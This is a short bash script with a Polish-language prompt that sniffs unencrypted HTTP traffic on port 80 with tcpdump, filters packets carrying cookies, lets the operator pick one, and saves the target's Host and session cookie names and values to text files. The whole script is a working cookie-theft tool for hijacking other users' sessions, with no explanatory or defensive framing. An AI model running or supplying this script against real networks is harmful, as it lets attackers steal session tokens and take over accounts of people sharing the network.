#!/bin/bash

timeout 15 tcpdump -A -l dst port 80 -w ee2

tshark -r ee2 -Y "http.cookie" -w ee5
xdg-open ee5

echo "podaj numer: "
read v1

editcap -r ee5 ee4 $v1

tcpdump -r ee4 -A -l |grep "^Host" > Host.txt
tcpdump -r ee4 -A -l |grep "Cookie:" >Cookie.txt

sed -i 's/Host: //g' Host.txt
sed -i 's/Cookie: //g' Cookie.txt
sed -i 's/; /\n/g' Cookie.txt
sed -i 's/=/\n/' Cookie.txt

rm ee2 ee5 ee4

